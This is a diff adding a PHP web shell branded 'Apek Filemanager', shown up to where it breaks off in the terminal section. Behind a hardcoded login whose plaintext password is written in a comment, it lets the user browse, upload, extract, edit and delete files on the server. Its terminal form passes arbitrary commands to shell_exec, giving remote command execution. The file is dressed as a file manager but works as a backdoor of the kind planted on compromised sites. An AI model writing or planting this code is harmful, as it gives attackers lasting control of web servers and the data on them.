@@ -1,0 +1,1198 @@
+<?php
+// ====================
+// SESSION START (WAJIB PALING ATAS, SEKALI)
+// ====================
+session_start([
+    'cookie_lifetime' => 86400,
+    'cookie_httponly' => true,
+    'cookie_secure' => isset($_SERVER['HTTPS']),
+    'use_strict_mode' => true
+]);
+
+// ====================
+// APEK FILEMANAGER - LOGIN CONFIG
+// ====================
+
+// Password dalam bentuk SHA256 hash dari "apekganteng"
+// Anda bisa generate hash baru dengan:
+// echo hash('sha256', 'password_baru');
+$LOGIN_USER = 'adminapek';
+$LOGIN_PASS_HASH = 'cf4095ca133c92d27a8b27f0b62085736c3bcbc1dd9616813726c5275ccd1f1c'; // SHA256 dari "apekganteng"
+
+// Atau gunakan password hash yang lebih aman dengan password_hash()
+// $LOGIN_PASS_HASH = '$2y$10$YourHashedPasswordHere';
+
+// ====================
+// LOGIN HANDLER
+// ====================
+if (isset($_GET['logout'])) {
+    session_destroy();
+    header("Location: ?");
+    exit;
+}
+
+if (isset($_POST['login'])) {
+    if (
+        isset($_POST['username'], $_POST['password']) &&
+        $_POST['username'] === $LOGIN_USER
+    ) {
+        // Verifikasi password dengan SHA256
+        $input_password_hash = hash('sha256', $_POST['password']);
+        
+        if ($input_password_hash === $LOGIN_PASS_HASH) {
+            $_SESSION['apek_login'] = true;
+            header("Location: ?");
+            exit;
+        } else {
+            $login_error = "Username atau password salah!";
+        }
+    } else {
+        $login_error = "Username atau password salah!";
+    }
+}
+
+// ====================
+// LOGIN PAGE (BLOCK TOTAL FILE MANAGER)
+// ====================
+if (!isset($_SESSION['apek_login'])) {
+?>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Apek Filemanager - Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #fff;
+        }
+        
+        .login-box {
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(10px);
+            padding: 40px;
+            width: 380px;
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.5), 0 0 30px rgba(0,255,136,0.3);
+            border: 1px solid rgba(0,255,136,0.3);
+        }
+        
+        .login-box h2 {
+            text-align: center;
+            color: #00ff88;
+            font-size: 28px;
+            margin-bottom: 10px;
+            text-shadow: 0 0 10px rgba(0,255,136,0.5);
+        }
+        
+        .login-box .subtitle {
+            text-align: center;
+            color: #888;
+            font-size: 12px;
+            margin-bottom: 30px;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #00ff88;
+            font-weight: 600;
+            font-size: 14px;
+        }
+        
+        .input-group input {
+            width: 100%;
+            padding: 12px 15px;
+            background: rgba(255,255,255,0.1);
+            border: 1px solid #333;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 14px;
+            transition: all 0.3s;
+        }
+        
+        .input-group input:focus {
+            outline: none;
+            border-color: #00ff88;
+            box-shadow: 0 0 10px rgba(0,255,136,0.3);
+        }
+        
+        button {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(135deg, #00ff88, #00cc66);
+            border: none;
+            border-radius: 8px;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            color: #000;
+            transition: all 0.3s;
+            margin-top: 10px;
+        }
+        
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(0,255,136,0.4);
+        }
+        
+        .error {
+            color: #ff4444;
+            text-align: center;
+            margin-top: 15px;
+            padding: 10px;
+            background: rgba(255,68,68,0.1);
+            border-radius: 8px;
+            font-size: 14px;
+        }
+        
+        .security-badge {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 11px;
+            color: #666;
+        }
+        
+        .footer-text {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h2>ðŸ” Apek Filemanager</h2>
+        <div class="subtitle">Secure File Management System</div>
+        
+        <?php if(isset($login_error)): ?>
+            <div class="error">âš ï¸ <?php echo htmlspecialchars($login_error); ?></div>
+        <?php endif; ?>
+        
+        <form method="post">
+            <div class="input-group">
+                <label>ðŸ‘¤ Username</label>
+                <input type="text" name="username" placeholder="Enter username" required autofocus>
+            </div>
+            <div class="input-group">
+                <label>ðŸ”‘ Password</label>
+                <input type="password" name="password" placeholder="Enter password" required>
+            </div>
+            <button type="submit" name="login">ðŸš€ LOGIN</button>
+        </form>
+        
+        <div class="security-badge">
+            ðŸ”’ Password protected
+        </div>
+        
+        <div class="footer-text">
+            <small>Â© Apek Filemanager | Secure Access Only</small>
+        </div>
+    </div>
+</body>
+</html>
+<?php
+exit;
+}
+
+// ===========================================
+// KONFIGURASI KEAMANAN DAN STABILITAS
+// ===========================================
+error_reporting(0);
+ini_set('display_errors', 0);
+ini_set('log_errors', 1);
+ini_set('error_log', 'php_errors.log');
+
+date_default_timezone_set('Asia/Jakarta');
+
+// ===========================================
+// FUNGSI UTAMA
+// ===========================================
+
+function getSafePath($path) {
+    if (!$path || !is_string($path)) {
+        return getcwd();
+    }
+    
+    $realpath = realpath($path);
+    if ($realpath === false || !is_dir($realpath)) {
+        return getcwd();
+    }
+    
+    return $realpath;
+}
+
+function formatSize($s) {
+    if (!is_numeric($s) || $s < 0) {
+        return '0 B';
+    }
+    
+    $s = (float)$s;
+    if ($s >= 1073741824) return round($s / 1073741824, 2) . ' GB';
+    if ($s >= 1048576) return round($s / 1048576, 2) . ' MB';
+    if ($s >= 1024) return round($s / 1024, 2) . ' KB';
+    return $s . ' B';
+}
+
+function sanitizeFilename($filename) {
+    $filename = preg_replace('/[^a-zA-Z0-9\.\-\_]/', '', $filename);
+    $filename = substr($filename, 0, 255);
+    return $filename;
+}
+
+// ===========================================
+// VALIDASI INPUT
+// ===========================================
+
+$input_path = isset($_GET['path']) ? $_GET['path'] : '';
+if (!is_string($input_path)) {
+    $input_path = '';
+}
+
+$path = getSafePath($input_path);
+$home_shell_path = realpath(dirname(__FILE__)) ?: getcwd();
+
+// ===========================================
+// HANDLING OPERASI FILE
+// ===========================================
+
+// 1. DELETE
+if (isset($_GET['delete'])) {
+    try {
+        $delete_target = $_GET['delete'];
+        if (!is_string($delete_target)) {
+            throw new Exception('Invalid delete target');
+        }
+        
+        $target = realpath($path . '/' . $delete_target);
+        if ($target === false || strpos($target, $path) !== 0) {
+            throw new Exception('Invalid path');
+        }
+        
+        if (is_file($target)) {
+            if (is_writable($target)) {
+                $result = unlink($target);
+                if (!$result) throw new Exception('Failed to delete file');
+            }
+        } elseif (is_dir($target)) {
+            if (is_writable($target)) {
+                $files = scandir($target);
+                $files = array_diff($files, ['.', '..']);
+                if (empty($files)) {
+                    $result = rmdir($target);
+                    if (!$result) throw new Exception('Failed to delete directory');
+                } else {
+                    $_SESSION['error'] = 'Directory is not empty';
+                }
+            }
+        }
+    } catch (Exception $e) {
+        $_SESSION['error'] = 'Delete failed: ' . $e->getMessage();
+    }
+    
+    header("Location: ?path=" . urlencode($path));
+    exit;
+}
+
+// 2. RENAME
+if (isset($_POST['rename_from'], $_POST['rename_to'])) {
+    try {
+        $from = realpath($path . '/' . $_POST['rename_from']);
+        $to_name = sanitizeFilename($_POST['rename_to']);
+        $to = $path . '/' . $to_name;
+        
+        if ($from === false || strpos($from, $path) !== 0 || !file_exists($from)) {
+            throw new Exception('Invalid source file');
+        }
+        
+        if ($to_name === '' || file_exists($to)) {
+            throw new Exception('Invalid target name or file exists');
+        }
+        
+        $result = rename($from, $to);
+        if (!$result) throw new Exception('Rename failed');
+    } catch (Exception $e) {
+        $_SESSION['error'] = 'Rename failed: ' . $e->getMessage();
+    }
+    
+    header("Location: ?path=" . urlencode($path));
+    exit;
+}
+
+// 3. CREATE FOLDER
+if (isset($_POST['new_folder'])) {
+    try {
+        $folder_name = sanitizeFilename($_POST['new_folder']);
+        if ($folder_name === '') throw new Exception('Invalid folder name');
+        
+        $full_path = $path . '/' . $folder_name;
+        if (file_exists($full_path)) throw new Exception('Folder already exists');
+        
+        $result = mkdir($full_path, 0755, true);
+        if (!$result) throw new Exception('Failed to create folder');
+    } catch (Exception $e) {
+        $_SESSION['error'] = 'Create folder failed: ' . $e->getMessage();
+    }
+    
+    header("Location: ?path=" . urlencode($path));
+    exit;
+}
+
+// 4. CREATE FILE
+if (isset($_POST['new_file'])) {
+    try {
+        $file_name = sanitizeFilename($_POST['new_file']);
+        if ($file_name === '') throw new Exception('Invalid file name');
+        
+        $full_path = $path . '/' . $file_name;
+        if (file_exists($full_path)) throw new Exception('File already exists');
+        
+        $result = file_put_contents($full_path, '');
+        if ($result === false) throw new Exception('Failed to create file');
+    } catch (Exception $e) {
+        $_SESSION['error'] = 'Create file failed: ' . $e->getMessage();
+    }
+    
+    header("Location: ?path=" . urlencode($path));
+    exit;
+}
+
+// 5. UPLOAD
+if (isset($_FILES['upload'])) {
+    try {
+        if ($_FILES['upload']['error'] !== UPLOAD_ERR_OK) {
+            throw new Exception('Upload error: ' . $_FILES['upload']['error']);
+        }
+        
+        $file_name = sanitizeFilename($_FILES['upload']['name']);
+        if ($file_name === '') throw new Exception('Invalid file name');
+        
+        $dangerous_ext = ['php', 'phtml', 'php3', 'php4', 'php5', 'php7', 'phps'];
+        $ext = strtolower(pathinfo($file_name, PATHINFO_EXTENSION));
+        if (in_array($ext, $dangerous_ext)) {
+            $file_name .= '.txt';
+        }
+        
+        $dest = $path . '/' . $file_name;
+        $result = move_uploaded_file($_FILES['upload']['tmp_name'], $dest);
+        if (!$result) throw new Exception('Move uploaded file failed');
+    } catch (Exception $e) {
+        $_SESSION['error'] = 'Upload failed: ' . $e->getMessage();
+    }
+    
+    header("Location: ?path=" . urlencode($path));
+    exit;
+}
+
+// 6. ZIP UPLOAD
+if (!empty($_FILES['zipfile']['name'])) {
+    try {
+        if ($_FILES['zipfile']['error'] !== UPLOAD_ERR_OK) {
+            throw new Exception('Zip upload error');
+        }
+        
+        $zipName = sanitizeFilename($_FILES['zipfile']['name']);
+        $tmpZip = $_FILES['zipfile']['tmp_name'];
+        
+        $ext = strtolower(pathinfo($zipName, PATHINFO_EXTENSION));
+        if ($ext !== 'zip') throw new Exception('Only ZIP files are allowed');
+        
+        $destZip = $path . '/' . $zipName;
+        
+        if (move_uploaded_file($tmpZip, $destZip)) {
+            if (!class_exists('ZipArchive')) {
+                throw new Exception('ZipArchive class not available');
+            }
+            
+            $zip = new ZipArchive;
+            if ($zip->open($destZip) !== TRUE) {
+                throw new Exception('Cannot open zip file');
+            }
+            
+            $zip->extractTo($path);
+            $zip->close();
+            
+            if (file_exists($destZip)) {
+                unlink($destZip);
+            }
+        }
+    } catch (Exception $e) {
+        $_SESSION['error'] = 'Zip operation failed: ' . $e->getMessage();
+    }
+    
+    header("Location: ?path=" . urlencode($path));
+    exit;
+}
+
+// 7. SAVE FILE
+if (isset($_POST['save_file'], $_POST['content'])) {
+    try {
+        $file = realpath($path . '/' . $_POST['save_file']);
+        if ($file === false || strpos($file, $path) !== 0 || !is_file($file)) {
+            throw new Exception('Invalid file');
+        }
+        
+        $result = file_put_contents($file, $_POST['content']);
+        if ($result === false) throw new Exception('Failed to save file');
+        
+        $_SESSION['success'] = 'File saved successfully!';
+    } catch (Exception $e) {
+        $_SESSION['error'] = 'Save failed: ' . $e->getMessage();
+    }
+    
+    header("Location: ?path=" . urlencode($path));
+    exit;
+}
+?>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Apek Filemanager - File Manager</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', 'Tahoma', 'Geneva', 'Verdana', sans-serif;
+            background: #0a0e1a;
+            color: #e0e0e0;
+            line-height: 1.6;
+            padding: 20px;
+        }
+        
+        /* Header & Navigation */
+        .header {
+            background: linear-gradient(135deg, #1a1f2e, #0f1420);
+            padding: 20px 30px;
+            border-radius: 12px;
+            margin-bottom: 25px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+            border-left: 4px solid #00ff88;
+        }
+        
+        .header h1 {
+            color: #00ff88;
+            font-size: 28px;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .header .tagline {
+            color: #88aaff;
+            font-size: 14px;
+            font-style: italic;
+        }
+        
+        .nav-buttons {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+            margin-top: 15px;
+        }
+        
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 18px;
+            background: #1e2438;
+            color: #e0e0e0;
+            text-decoration: none;
+            border-radius: 8px;
+            border: 1px solid #2a3248;
+            transition: all 0.2s;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+        
+        .btn:hover {
+            background: #2a3248;
+            border-color: #00ff88;
+            transform: translateY(-1px);
+        }
+        
+        .btn-primary {
+            background: linear-gradient(135deg, #00cc88, #00aa66);
+            color: #000;
+            border: none;
+            font-weight: bold;
+        }
+        
+        .btn-primary:hover {
+            background: linear-gradient(135deg, #00dd99, #00bb77);
+            box-shadow: 0 0 15px rgba(0,255,136,0.3);
+        }
+        
+        .btn-danger {
+            border-color: #ff4444;
+            color: #ff8888;
+        }
+        
+        .btn-danger:hover {
+            background: rgba(255,68,68,0.1);
+            border-color: #ff4444;
+        }
+        
+        /* Path Navigation */
+        .path-nav {
+            background: #11161f;
+            padding: 12px 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            font-family: monospace;
+            font-size: 14px;
+            word-break: break-all;
+        }
+        
+        .path-nav a {
+            color: #00ccff;
+            text-decoration: none;
+            padding: 3px 6px;
+            border-radius: 4px;
+        }
+        
+        .path-nav a:hover {
+            background: rgba(0,204,255,0.1);
+            text-decoration: underline;
+        }
+        
+        .path-nav .current {
+            color: #00ff88;
+            font-weight: bold;
+        }
+        
+        /* Messages */
+        .message {
+            padding: 12px 18px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            animation: slideIn 0.3s ease;
+        }
+        
+        .error-message {
+            background: rgba(255,68,68,0.15);
+            border-left: 4px solid #ff4444;
+            color: #ff8888;
+        }
+        
+        .success-message {
+            background: rgba(0,255,136,0.1);
+            border-left: 4px solid #00ff88;
+            color: #88ffaa;
+        }
+        
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        /* Table */
+        .file-table {
+            width: 100%;
+            background: #11161f;
+            border-radius: 12px;
+            overflow: hidden;
+            margin: 20px 0;
+            border-collapse: collapse;
+        }
+        
+        .file-table th {
+            background: #1a1f2e;
+            padding: 14px 12px;
+            text-align: left;
+            font-weight: 600;
+            color: #00ff88;
+            border-bottom: 2px solid #00ff88;
+        }
+        
+        .file-table td {
+            padding: 12px;
+            border-bottom: 1px solid #1e2438;
+        }
+        
+        .file-table tr:hover {
+            background: rgba(0,255,136,0.05);
+        }
+        
+        /* Permission colors */
+        .perm-755 { color: #88ff88; }
+        .perm-777 { color: #ffff88; }
+        .perm-644 { color: #ffffff; }
+        .perm-000 { color: #ff8888; }
+        
+        /* Forms */
+        .form-section {
+            background: #11161f;
+            padding: 20px;
+            border-radius: 12px;
+            margin: 20px 0;
+            border: 1px solid #1e2438;
+        }
+        
+        .form-section h3 {
+            color: #00ccff;
+            margin-bottom: 15px;
+            font-size: 18px;
+            border-left: 3px solid #00ff88;
+            padding-left: 12px;
+        }
+        
+        .form-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 20px;
+            margin-top: 15px;
+        }
+        
+        .form-card {
+            background: #0a0f17;
+            padding: 18px;
+            border-radius: 10px;
+            border: 1px solid #1e2438;
+        }
+        
+        .form-card h4 {
+            color: #00ff88;
+            margin-bottom: 12px;
+            font-size: 16px;
+        }
+        
+        input[type="text"],
+        input[type="file"],
+        input[type="datetime-local"],
+        textarea {
+            width: 100%;
+            padding: 10px 12px;
+            background: #0a0f17;
+            border: 1px solid #2a3248;
+            border-radius: 6px;
+            color: #e0e0e0;
+            font-family: inherit;
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+        
+        input:focus,
+        textarea:focus {
+            outline: none;
+            border-color: #00ff88;
+            box-shadow: 0 0 0 2px rgba(0,255,136,0.1);
+        }
+        
+        textarea {
+            font-family: 'Consolas', 'Monaco', monospace;
+            font-size: 13px;
+            line-height: 1.5;
+        }
+        
+        /* Action buttons */
+        .action-group {
+            display: flex;
+            gap: 6px;
+            flex-wrap: wrap;
+        }
+        
+        .action-btn {
+            padding: 4px 8px;
+            background: #1e2438;
+            border: 1px solid #2a3248;
+            border-radius: 5px;
+            color: #aaa;
+            cursor: pointer;
+            font-size: 12px;
+            transition: all 0.2s;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+        }
+        
+        .action-btn:hover {
+            background: #2a3248;
+            color: #00ccff;
+            border-color: #00ccff;
+        }
+        
+        .delete-btn:hover {
+            color: #ff4444;
+            border-color: #ff4444;
+        }
+        
+        /* Terminal */
+        .terminal {
+            background: #000;
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 20px 0;
+            border: 1px solid #00ff88;
+        }
+        
+        .terminal-header {
+            background: #00ff88;
+            color: #000;
+            padding: 10px 15px;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        
+        .terminal-output {
+            padding: 15px;
+            max-height: 400px;
+            overflow-y: auto;
+            font-family: 'Consolas', 'Monaco', monospace;
+            font-size: 13px;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            color: #00ff88;
+            background: #000;
+        }
+        
+        /* Loading Overlay */
+        .loading {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.8);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #333;
+            border-top-color: #00ff88;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* Footer */
+        .footer {
+            margin-top: 30px;
+            padding: 20px;
+            text-align: center;
+            color: #666;
+            border-top: 1px solid #1e2438;
+            font-size: 12px;
+        }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            body { padding: 10px; }
+            .file-table { font-size: 12px; }
+            .file-table th, .file-table td { padding: 8px; }
+            .action-group { flex-wrap: wrap; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="loading" id="loading">
+    <div class="spinner"></div>
+</div>
+
+<!-- Header -->
+<div class="header">
+    <h1>
+        ðŸ“ Apek Filemanager
+        <span style="font-size: 14px; color: #88aaff;">v2.0</span>
+    </h1>
+    <div class="tagline">berang berang bawa gelek berangkat lek !!!</div>
+    
+    <div class="nav-buttons">
+        <a href="?path=<?php echo urlencode($home_shell_path); ?>" class="btn btn-primary">ðŸ  Home Shell</a>
+        <a href="#" onclick="refreshPage()" class="btn">ðŸ”„ Refresh</a>
+        <a href="?logout" class="btn btn-danger" onclick="return confirm('Logout from file manager?')">ðŸšª Logout</a>
+    </div>
+</div>
+
+<!-- Messages -->
+<?php if (isset($_SESSION['error'])): ?>
+    <div class="message error-message">
+        âš ï¸ ERROR: <?php echo htmlspecialchars($_SESSION['error']); unset($_SESSION['error']); ?>
+    </div>
+<?php endif; ?>
+
+<?php if (isset($_SESSION['success'])): ?>
+    <div class="message success-message">
+        âœ… SUCCESS: <?php echo htmlspecialchars($_SESSION['success']); unset($_SESSION['success']); ?>
+    </div>
+<?php endif; ?>
+
+<!-- Path Navigation -->
+<div class="path-nav">
+    ðŸ“‚ <strong>Current Path:</strong> 
+    <?php
+    $parts = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR));
+    $build = '';
+    echo '<a href="?path=' . urlencode($home_shell_path) . '">Home</a>';
+    foreach ($parts as $part) {
+        if ($part === '') continue;
+        $build .= '/' . $part;
+        echo ' / <a href="?path=' . urlencode($build) . '">' . htmlspecialchars($part) . '</a>';
+    }
+    ?>
+</div>
+
+<!-- Parent Directory Link -->
+<?php if ($path !== $home_shell_path && $path !== '/'): ?>
+    <div style="margin-bottom: 15px;">
+        <a href="?path=<?php echo urlencode(dirname($path)); ?>" class="btn">
+            â¬†ï¸ Parent Directory
+        </a>
+    </div>
+<?php endif; ?>
+
+<!-- File Browser -->
+<div class="form-section">
+    <h3>ðŸ“ File Browser</h3>
+    <table class="file-table">
+        <thead>
+            <tr>
+                <th>Name</th>
+                <th>Size</th>
+                <th>Permissions</th>
+                <th>Modified</th>
+                <th>Actions</th>
+            </tr>
+        </thead>
+        <tbody>
+            <?php
+            try {
+                $items = scandir($path);
+                if ($items === false) {
+                    throw new Exception('Cannot read directory');
+                }
+                
+                $dirs = [];
+                $files = [];
+                
+                foreach ($items as $f) {
+                    if ($f === '.' || $f === '..') continue;
+                    $full = $path . '/' . $f;
+                    
+                    if (!file_exists($full)) continue;
+                    
+                    if (is_dir($full)) {
+                        $dirs[] = $f;
+                    } else {
+                        $files[] = $f;
+                    }
+                }
+                
+                sort($dirs);
+                sort($files);
+                $all = array_merge($dirs, $files);
+                
+                if (empty($all)) {
+                    echo '<tr><td colspan="5" style="text-align:center; color:#666;">ðŸ“ Directory is empty</td></tr>';
+                }
+                
+                foreach ($all as $f):
+                    $full = $path . '/' . $f;
+                    if (!file_exists($full)) continue;
+                    
+                    $is_dir = is_dir($full);
+                    $icon = $is_dir ? 'ðŸ“' : 'ðŸ“„';
+                    $ext = strtolower(pathinfo($f, PATHINFO_EXTENSION));
+                    
+                    if (!$is_dir) {
+                        if (in_array($ext, ['jpg','jpeg','png','gif','bmp','svg'])) $icon = 'ðŸ–¼ï¸';
+                        elseif (in_array($ext, ['zip','rar','7z','tar','gz'])) $icon = 'ðŸ“¦';
+                        elseif (in_array($ext, ['php','html','js','css','txt'])) $icon = 'ðŸ“';
+                        elseif (in_array($ext, ['mp3','wav','ogg'])) $icon = 'ðŸŽµ';
+                        elseif (in_array($ext, ['mp4','avi','mkv'])) $icon = 'ðŸŽ¬';
+                    }
+                    
+                    $perm_num = substr(sprintf('%o', fileperms($full)), -4);
+                    $perm_class = 'perm-' . $perm_num;
+                    
+                    $mtime = filemtime($full);
+                    $date_formatted = date('Y-m-d H:i:s', $mtime);
+            ?>
+            <tr>
+                <td style="font-weight: <?php echo $is_dir ? 'bold' : 'normal'; ?>">
+                    <?php echo $icon . ' '; ?>
+                    <?php if ($is_dir): ?>
+                        <a href="?path=<?php echo urlencode($full); ?>" style="color: #00ff88; text-decoration: none;">
+                            <?php echo htmlspecialchars($f); ?>
+                        </a>
+                    <?php else: ?>
+                        <a href="?path=<?php echo urlencode($path); ?>&edit=<?php echo urlencode($f); ?>" style="color: #88aaff; text-decoration: none;">
+                            <?php echo htmlspecialchars($f); ?>
+                        </a>
+                        <span style="color:#666; font-size:11px;">(<?php echo number_format(filesize($full)); ?> bytes)</span>
+                    <?php endif; ?>
+                </td>
+                <td><?php echo $is_dir ? '&lt;DIR&gt;' : formatSize(filesize($full)); ?></td>
+                <td class="<?php echo $perm_class; ?>"><?php echo $perm_num; ?></td>
+                <td><?php echo $date_formatted; ?></td>
+                <td class="action-group">
+                    <!-- Rename -->
+                    <form method="post" style="display:inline;" onsubmit="return confirmRename(this)">
+                        <input type="hidden" name="rename_from" value="<?php echo htmlspecialchars($f); ?>">
+                        <input type="text" name="rename_to" value="<?php echo htmlspecialchars($f); ?>" 
+                               style="width:80px; padding:3px; font-size:11px;" placeholder="new name">
+                        <button type="submit" class="action-btn" title="Rename">âœï¸</button>
+                    </form>
+                    
+                    <!-- Edit (files only) -->
+                    <?php if (!$is_dir): ?>
+                        <a href="?path=<?php echo urlencode($path); ?>&edit=<?php echo urlencode($f); ?>" class="action-btn" title="Edit">âœï¸</a>
+                    <?php endif; ?>
+                    
+                    <!-- Delete -->
+                    <a href="?path=<?php echo urlencode($path); ?>&delete=<?php echo urlencode($f); ?>" 
+                       onclick="return confirmDelete('<?php echo addslashes(htmlspecialchars($f)); ?>')"
+                       class="action-btn delete-btn" title="Delete">ðŸ—‘ï¸</a>
+                </td>
+            </tr>
+            <?php 
+                endforeach;
+            } catch (Exception $e) {
+                echo '<tr><td colspan="5" style="color:#ff8888;">âš ï¸ Error: ' . htmlspecialchars($e->getMessage()) . '</td></tr>';
+            }
+            ?>
+        </tbody>
+    </table>
+</div>
+
+<!-- Upload Section -->
+<div class="form-section">
+    <h3>ðŸ“¤ Upload Files</h3>
+    <div class="form-grid">
+        <div class="form-card">
+            <h4>ðŸ“„ Single File</h4>
+            <form method="post" enctype="multipart/form-data" onsubmit="showLoading()">
+                <input type="file" name="upload" required>
+                <button type="submit" class="btn" style="width:100%;">Upload File</button>
+            </form>
+        </div>
+        
+        <div class="form-card">
+            <h4>ðŸ—œï¸ ZIP Extract</h4>
+            <form method="post" enctype="multipart/form-data" onsubmit="showLoading()">
+                <input type="file" name="zipfile" accept=".zip" required>
+                <button type="submit" class="btn" style="width:100%;">Upload & Extract ZIP</button>
+                <small style="color:#666;">ZIP akan diekstrak dan dihapus</small>
+            </form>
+        </div>
+    </div>
+</div>
+
+<!-- Create Section -->
+<div class="form-section">
+    <h3>âž• Create New</h3>
+    <div class="form-grid">
+        <div class="form-card">
+            <h4>ðŸ“ New Folder</h4>
+            <form method="post" onsubmit="showLoading()">
+                <input type="text" name="new_folder" placeholder="folder_name" required 
+                       pattern="[a-zA-Z0-9\.\-\_]+" title="Only letters, numbers, dots, hyphens, underscores">
+                <button type="submit" class="btn" style="width:100%;">Create Folder</button>
+            </form>
+        </div>
+        
+        <div class="form-card">
+            <h4>ðŸ“„ New File</h4>
+            <form method="post" onsubmit="showLoading()">
+                <input type="text" name="new_file" placeholder="filename.txt" required 
+                       pattern="[a-zA-Z0-9\.\-\_]+" title="Only letters, numbers, dots, hyphens, underscores">
+                <button type="submit" class="btn" style="width:100%;">Create File</button>
+            </form>
+        </div>
+    </div>
+</div>
+
+<!-- File Editor -->
+<?php
+if (isset($_GET['edit'])):
+    $edit_file = $_GET['edit'];
+    $edit_path = realpath($path . '/' . $edit_file);
+    
+    if ($edit_path !== false && strpos($edit_path, $path) === 0 && is_file($edit_path)):
+        $content = file_get_contents($edit_path);
+        if ($content === false) $content = '';
+?>
+<div class="form-section">
+    <h3>âœï¸ Editing: <?php echo htmlspecialchars(basename($edit_path)); ?></h3>
+    
+    <div style="background: #0a0f17; padding: 12px; border-radius: 8px; margin-bottom: 15px; font-size: 13px;">
+        ðŸ“„ Path: <?php echo htmlspecialchars($edit_path); ?><br>
+        ðŸ“ Size: <?php echo formatSize(filesize($edit_path)); ?> | 
+        ðŸ• Last Modified: <?php echo date('Y-m-d H:i:s', filemtime($edit_path)); ?>
+    </div>
+    
+    <form method="post" onsubmit="showLoading()">
+        <input type="hidden" name="save_file" value="<?php echo htmlspecialchars(basename($edit_path)); ?>">
+        <textarea name="content" style="width:100%; height:500px; font-family: monospace; font-size: 13px;" 
+                  spellcheck="false"><?php echo htmlspecialchars($content); ?></textarea>
+        
+        <div style="margin-top: 15px; display: flex; gap: 10px;">
+            <button type="submit" class="btn btn-primary" style="flex:2;">ðŸ’¾ Save Changes</button>
+            <a href="?path=<?php echo urlencode($path); ?>" class="btn" style="flex:1;">â†©ï¸ Back</a>
+        </div>
+    </form>
+</div>
+<?php
+    else:
+        echo '<div class="message error-message">âš ï¸ File not found or inaccessible</div>';
+    endif;
+endif;
+?>
+
+<!-- Terminal -->
+<div class="terminal">
+    <div class="terminal-header">
+        ðŸ’» Terminal / Command Line
+        <span style="float:right;">Current: <?php echo htmlspecialchars($path); ?></span>
+    </div>
+    
+    <form method="post" onsubmit="showLoading()" style="padding: 15px;">
+        <div style="display: flex; gap: 10px;">
+            <input type="text" name="cmd" placeholder="Enter command (ls, pwd, whoami, etc.)" 
+                   style="flex:1; background:#000; border-color:#333;" 
+                   value="<?php echo isset($_POST['cmd']) ? htmlspecialchars($_POST['cmd']) : ''; ?>"
+                   id="cmdInput">
+            <button type="submit" class="btn btn-primary">â–¶ Run</button>
+        </div>
+        
+        <div style="margin-top: 10px; display: flex; gap: 8px; flex-wrap: wrap;">
+            <button type="button" onclick="insertCmd('pwd')" class="action-btn">pwd</button>
+            <button type="button" onclick="insertCmd('ls -la')" class="action-btn">ls -la</button>
+            <button type="button" onclick="insertCmd('whoami')" class="action-btn">whoami</button>
+            <button type="button" onclick="insertCmd('df -h')" class="action-btn">df -h</button>
+            <button type="button" onclick="insertCmd('free -m')" class="action-btn">free -m</button>
+            <button type="button" onclick="clearTerminal()" class="action-btn delete-btn">Clear</button>
+        </div>
+    </form>
+    
+    <?php if (isset($_POST['cmd']) && trim($_POST['cmd']) !== ''): 
+        $cmd = trim($_POST['cmd']);
+        $safe_cmd = 'cd ' . escapeshellarg($path) . ' 2>/dev/null && ' . escapeshellcmd($cmd) . ' 2>&1';
+        $output = shell_exec($safe_cmd);
+        if ($output === null) $output = '[No output or command not allowed]';
+    ?>
+    <div class="terminal-output">
+        <div style="color: #00ccff;">$ <?php echo htmlspecialchars($cmd); ?></div>
